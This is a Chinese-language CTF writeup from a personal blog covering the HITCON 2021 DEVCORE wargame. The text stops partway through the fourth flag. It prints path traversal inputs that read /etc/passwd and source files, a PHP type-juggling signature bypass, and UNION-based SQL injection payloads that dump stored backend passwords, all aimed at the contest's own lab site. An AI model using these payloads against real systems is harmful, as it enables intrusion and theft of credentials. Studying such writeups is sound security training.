@@ -1,0 +1,273 @@
+<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="noindex, nofollow"><title>HITCON 2021 DEVCORE Wargame Writeup | Gary Blog</title>
+<meta name=keywords content="security,writeup"><meta name=description content="Flag 1
+在首頁可以看到一張圖片，URL長成這樣。
+
+http://web.ctf.devcore.tw/image.php?id=aHBfbTI4M2Zkdy5qcGc=
+其中 aHBfbTI4M2Zkdy5qcGc= 拿去 base64 deocde 會變成 hp_m283fdw.jpg ，發現是一個檔名，
+這裡可以嘗試 path traversal。
+嘗試讀取 ../../../../etc/passwd 成功，繼續嘗試讀取 source code。
+
+先讀取 mount device ../../../../proc/mounts，嘗試找出 web root。
+
+/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
+/dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
+/dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
+接著讀取 /usr/share/nginx/frontend/index.php 可以發現首頁的 source code。
+
+裡面有引入 include.php，讀取 include.php 後可以在裡面發現第一個 flag。
+
+Flag 2
+在 order.php 中，可以看到 sig 沒有做型別的驗證，可以利用 PHP 的弱型別繞過程式中的 sig 驗證。
+# order.php
+require_once('include.php');
+
+$id = get_get_param('id', '');
+$sig = get_get_param('sig', '');
+
+if (empty($id) || empty($sig)) {
+    header('Location: /');
+    exit();
+}
+
+$id = intval($id);
+$pdo = get_pdo();
+$res = $pdo->query('SELECT * FROM orders WHERE id = '.$id, PDO::FETCH_ASSOC);
+$order = $res->fetch();
+
+if (!$order) {
+    $_SESSION['error_msg'] = '找不到此訂單';
+    require_once('error.php');
+}
+
+$sig_hash = get_sig_hash($sig);
+if ($sig_hash && $sig_hash != $order['sig_hash']) {
+    $_SESSION['error_msg'] = '訂單網址參數錯誤';
+    require_once('error.php');
+}
+
+switch ($order['status']) {
+    case ORDER_STATUS_PICKING:
+        $step = 1;
+        break;
+    case ORDER_STATUS_PACKING:
+        $step = 2;
+        break;
+    case ORDER_STATUS_SENDING:
+        $step = 3;
+        break;
+    case ORDER_STATUS_DELIVERING:
+        $step = 4;
+        break;
+    case ORDER_STATUS_ARRIVED:
+        $step = 5;
+        break;
+    case ORDER_STATUS_FINISH:
+        $step = 6;
+        break;
+}
+# include.php
+function get_sig_hash($data) {
+    $pdo = get_pdo();
+    $res = $pdo->query(&#34;SELECT `value` FROM options WHERE `key` = 'sig_secret' LIMIT 1&#34;, PDO::FETCH_ASSOC);
+    $row = $res->fetch();
+    if (!$row) {
+        $secret = random_str(64);
+        $pdo->exec(&#34;INSERT INTO options VALUES ('sig_secret', '&#34;.$secret.&#34;'), ('sig_algorithm', 'sha256')&#34;);
+    } else {
+        $secret = $row['value'];
+    }
+    $res = $pdo->query(&#34;SELECT `value` FROM options WHERE `key` = 'sig_algorithm' LIMIT 1&#34;, PDO::FETCH_ASSOC);
+    $algo = $res->fetch()['value'];
+    return hash_hmac($algo, $data, $secret);
+}
+如果將 sig 以陣列的方式傳入 if ($sig_hash && $sig_hash != $order['sig_hash']) 結果會變成 if (NULL && NULL != &#34;abc&#34;) 恆為 False。"><meta name=author content><link rel=canonical href=http://localhost:1313/posts/security/hitcon-2021-devcore-wargame-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css integrity="sha256-1yREUm1+y9sAFUOKf6iQVKZYv3WdBULi5d+BzpS0k+4=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/favicon-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/apple-touch-icon.png><link rel=mask-icon href=http://localhost:1313/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/security/hitcon-2021-devcore-wargame-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Gary Blog (Alt + H)">Gary Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/archives/ title=archives><span>archives</span></a></li><li><a href=http://localhost:1313/categories/ title=categories><span>categories</span></a></li><li><a href=http://localhost:1313/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">HITCON 2021 DEVCORE Wargame Writeup</h1><div class=post-meta><span title='2021-11-30 22:19:10 +0800 CST'>November 30, 2021</span></div></header><div class=post-content><h2 id=flag-1>Flag 1<a hidden class=anchor aria-hidden=true href=#flag-1>#</a></h2><p>在首頁可以看到一張圖片，URL長成這樣。</p><p><img alt=pic loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/pic.png></p><p><code>http://web.ctf.devcore.tw/image.php?id=aHBfbTI4M2Zkdy5qcGc=</code></p><p>其中 <code>aHBfbTI4M2Zkdy5qcGc=</code> 拿去 base64 deocde 會變成 <code>hp_m283fdw.jpg</code> ，發現是一個檔名，
+這裡可以嘗試 path traversal。</p><p>嘗試讀取 <code>../../../../etc/passwd</code> 成功，繼續嘗試讀取 source code。</p><p><img alt=etc_passwd loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/etc_passwd.png></p><p>先讀取 mount device <code>../../../../proc/mounts</code>，嘗試找出 web root。</p><p><img alt=proc_mounts loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/proc_mounts.png></p><pre tabindex=0><code>/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
+/dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
+/dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
+</code></pre><p>接著讀取 <code>/usr/share/nginx/frontend/index.php</code> 可以發現首頁的 source code。</p><p><img alt=frontend_index loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/frontend_index.png></p><p>裡面有引入 <code>include.php</code>，讀取 <code>include.php</code> 後可以在裡面發現第一個 flag。</p><p><img alt=frontend_include loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/frontend_include.png></p><h2 id=flag-2>Flag 2<a hidden class=anchor aria-hidden=true href=#flag-2>#</a></h2><p>在 <code>order.php</code> 中，可以看到 <code>sig</code> 沒有做型別的驗證，可以利用 PHP 的弱型別繞過程式中的 <code>sig</code> 驗證。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># order.php
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;include.php&#39;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$id <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_get_param</span>(<span style=color:#e6db74>&#39;id&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>);
+</span></span><span style=display:flex><span>$sig <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_get_param</span>(<span style=color:#e6db74>&#39;sig&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>empty</span>($id) <span style=color:#f92672>||</span> <span style=color:#66d9ef>empty</span>($sig)) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Location: /&#39;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>exit</span>();
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$id <span style=color:#f92672>=</span> <span style=color:#a6e22e>intval</span>($id);
+</span></span><span style=display:flex><span>$pdo <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_pdo</span>();
+</span></span><span style=display:flex><span>$res <span style=color:#f92672>=</span> $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>(<span style=color:#e6db74>&#39;SELECT * FROM orders WHERE id = &#39;</span><span style=color:#f92672>.</span>$id, <span style=color:#a6e22e>PDO</span><span style=color:#f92672>::</span><span style=color:#a6e22e>FETCH_ASSOC</span>);
+</span></span><span style=display:flex><span>$order <span style=color:#f92672>=</span> $res<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$order) {
+</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;error_msg&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;找不到此訂單&#39;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;error.php&#39;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$sig_hash <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_sig_hash</span>($sig);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($sig_hash <span style=color:#f92672>&amp;&amp;</span> $sig_hash <span style=color:#f92672>!=</span> $order[<span style=color:#e6db74>&#39;sig_hash&#39;</span>]) {
+</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;error_msg&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;訂單網址參數錯誤&#39;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;error.php&#39;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>switch</span> ($order[<span style=color:#e6db74>&#39;status&#39;</span>]) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#a6e22e>ORDER_STATUS_PICKING</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>        $step <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#a6e22e>ORDER_STATUS_PACKING</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>        $step <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#a6e22e>ORDER_STATUS_SENDING</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>        $step <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#a6e22e>ORDER_STATUS_DELIVERING</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>        $step <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#a6e22e>ORDER_STATUS_ARRIVED</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>        $step <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#a6e22e>ORDER_STATUS_FINISH</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>        $step <span style=color:#f92672>=</span> <span style=color:#ae81ff>6</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># include.php
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>get_sig_hash</span>($data) {
+</span></span><span style=display:flex><span>    $pdo <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_pdo</span>();
+</span></span><span style=display:flex><span>    $res <span style=color:#f92672>=</span> $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>(<span style=color:#e6db74>&#34;SELECT `value` FROM options WHERE `key` = &#39;sig_secret&#39; LIMIT 1&#34;</span>, <span style=color:#a6e22e>PDO</span><span style=color:#f92672>::</span><span style=color:#a6e22e>FETCH_ASSOC</span>);
+</span></span><span style=display:flex><span>    $row <span style=color:#f92672>=</span> $res<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch</span>();
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$row) {
+</span></span><span style=display:flex><span>        $secret <span style=color:#f92672>=</span> <span style=color:#a6e22e>random_str</span>(<span style=color:#ae81ff>64</span>);
+</span></span><span style=display:flex><span>        $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;INSERT INTO options VALUES (&#39;sig_secret&#39;, &#39;&#34;</span><span style=color:#f92672>.</span>$secret<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&#39;), (&#39;sig_algorithm&#39;, &#39;sha256&#39;)&#34;</span>);
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        $secret <span style=color:#f92672>=</span> $row[<span style=color:#e6db74>&#39;value&#39;</span>];
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    $res <span style=color:#f92672>=</span> $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>(<span style=color:#e6db74>&#34;SELECT `value` FROM options WHERE `key` = &#39;sig_algorithm&#39; LIMIT 1&#34;</span>, <span style=color:#a6e22e>PDO</span><span style=color:#f92672>::</span><span style=color:#a6e22e>FETCH_ASSOC</span>);
+</span></span><span style=display:flex><span>    $algo <span style=color:#f92672>=</span> $res<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch</span>()[<span style=color:#e6db74>&#39;value&#39;</span>];
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>hash_hmac</span>($algo, $data, $secret);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>如果將 <code>sig</code> 以陣列的方式傳入 <code>if ($sig_hash && $sig_hash != $order['sig_hash'])</code> 結果會變成 <code>if (NULL && NULL != "abc")</code> 恆為 False。</p><p>所以只要將 <code>sig=</code> 改為 <code>sig[]=</code> 就可以任意讀取訂單內容。</p><p>在網址輸入 <code>http://web.ctf.devcore.tw/order.php?id=1&amp;sig[]=</code> 即可獲得第二個 flag。</p><p><img alt=sig loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/sig.png></p><h2 id=flag-3>Flag 3<a hidden class=anchor aria-hidden=true href=#flag-3>#</a></h2><p>在 <code>print.php</code> 可以發現裡面有一個可以 SQL injection 的注入點。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;include.php&#39;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;third_party/vendor/autoload.php&#39;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//require_once(&#39;rate_limit.php&#39;);
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// rate limit is not working, use random sleep as a workaround
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>sleep</span>(<span style=color:#a6e22e>random_int</span>(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$is_from_print <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$id <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_get_param</span>(<span style=color:#e6db74>&#39;id&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>);
+</span></span><span style=display:flex><span>$sig <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_get_param</span>(<span style=color:#e6db74>&#39;sig&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>);
+</span></span><span style=display:flex><span>$sig_hash <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_sig_hash</span>($sig);
+</span></span><span style=display:flex><span>$pdo <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_pdo</span>();
+</span></span><span style=display:flex><span>$res <span style=color:#f92672>=</span> $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>(<span style=color:#e6db74>&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    SELECT *
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    FROM orders 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    WHERE sig_hash = &#39;</span><span style=color:#e6db74>$sig_hash</span><span style=color:#e6db74>&#39; AND id = </span><span style=color:#e6db74>$id</span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    LIMIT 1
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>PDO</span><span style=color:#f92672>::</span><span style=color:#a6e22e>FETCH_ASSOC</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>    $order <span style=color:#f92672>=</span> $res<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch</span>();
+</span></span><span style=display:flex><span>} <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>Error</span> $e) {
+</span></span><span style=display:flex><span>    $order <span style=color:#f92672>=</span> [];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>ob_start</span>();
+</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#39;pdf.php&#39;</span>);
+</span></span><span style=display:flex><span>$html <span style=color:#f92672>=</span> <span style=color:#a6e22e>ob_get_clean</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$mpdf <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>\Mpdf\Mpdf</span>([
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;tempDir&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;/tmp&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;autoScriptToLang&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>true</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;autoLangToFont&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>true</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;mode&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;utf-8&#39;</span>
+</span></span><span style=display:flex><span>]);
+</span></span><span style=display:flex><span>$mpdf<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>SetTitle</span>(<span style=color:#e6db74>&#39;收據明細&#39;</span>);
+</span></span><span style=display:flex><span>$mpdf<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>SetSubject</span>(<span style=color:#e6db74>&#39;收據明細&#39;</span>);
+</span></span><span style=display:flex><span>$mpdf<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>SetAuthor</span>(<span style=color:#a6e22e>random_str</span>((<span style=color:#a6e22e>random_int</span>(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>256</span>))));
+</span></span><span style=display:flex><span>$mpdf<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>SetCreator</span>(<span style=color:#a6e22e>random_str</span>((<span style=color:#a6e22e>random_int</span>(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>256</span>))));
+</span></span><span style=display:flex><span>$mpdf<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>WriteHTML</span>($html);
+</span></span><span style=display:flex><span>$mpdf<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>Output</span>();
+</span></span></code></pre></div><p>先在 <code>id</code> 中注入 <code>-1 or 1=1 -- </code>測試弱點是否成立。</p><p>可以成功找到第一筆訂單。</p><p><img alt=sqli_1 loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/sqli_1.png></p><p>並使用 <code>UNION</code> 看看有哪幾個欄位可以被利用。</p><p>插入 <code>-1 UNION SELECT 1,2,3,4,5,6,7,8,9 --</code></p><p><img alt=sqli_2 loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/sqli_2.png></p><p>而在 <code>/usr/share/nginx/b8ck3nd/login.php</code> 裡面可以找到儲存後台帳號密碼的資料表名稱 <code>backend_users</code></p><p>並利用 SQL injection 找出 <code>backend_users</code> 有哪些欄位。</p><p>插入 <code>-1 UNION SELECT GROUP_CONCAT(column_name SEPARATOR ','),2,3,4,5,6,7,8,9 FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name='backend_users' -- </code>後得到 <code>id,username,password,description</code></p><p><img alt=sqli_3 loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/sqli_3.png></p><p>得到欄位後，即可取得後台帳號密碼。
+<code>-1 UNION SELECT username,password,description,4,5,6,7,8,9 FROM backend_users --</code></p><p>並可以在 Description 中取得第三個 flag。</p><p><img alt=sqli_4 loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/sqli_4.png></p><h2 id=flag-4>Flag 4<a hidden class=anchor aria-hidden=true href=#flag-4>#</a></h2><p>在嘗試進入後台頁面 <code>http://web.ctf.devcore.tw/b8ck3nd/</code> 時，會被 redirect 回首頁。</p><p><img alt=redirect loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/redirect.png></p><p>利用 path traversal 查看 <code>/usr/share/nginx/b8ck3nd/include.php</code>，發現後台的頁面會驗證來源 IP，若來源 IP 不是 <code>127.0.0.1</code> 或 <code>172.18.11.89</code>，則會 redirect 回首頁。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;../frontend/include.php&#39;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>session_start_once</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>in_array</span>(<span style=color:#a6e22e>get_client_ip</span>(), [<span style=color:#e6db74>&#39;127.0.0.1&#39;</span>, <span style=color:#e6db74>&#39;172.18.11.89&#39;</span>], <span style=color:#66d9ef>true</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Location: /&#39;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>exit</span>();
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#39;user_id&#39;</span>])) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>endsWith</span>($_SERVER[<span style=color:#e6db74>&#39;SCRIPT_FILENAME&#39;</span>], <span style=color:#e6db74>&#39;login.php&#39;</span>)) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Location: /b8ck3nd/login.php&#39;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># ../frontend/include.php
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>get_client_ip</span>() {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_SERVER[<span style=color:#e6db74>&#39;HTTP_CLIENT_IP&#39;</span>])) {
+</span></span><span style=display:flex><span>        $ip <span style=color:#f92672>=</span> $_SERVER[<span style=color:#e6db74>&#39;HTTP_CLIENT_IP&#39;</span>];
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_SERVER[<span style=color:#e6db74>&#39;HTTP_X_FORWARDED_FOR&#39;</span>])) {
+</span></span><span style=display:flex><span>        $ip <span style=color:#f92672>=</span> $_SERVER[<span style=color:#e6db74>&#39;HTTP_X_FORWARDED_FOR&#39;</span>];
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        $ip <span style=color:#f92672>=</span> $_SERVER[<span style=color:#e6db74>&#39;REMOTE_ADDR&#39;</span>];
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $ip;
+</span></span><span style=display:flex><span>}
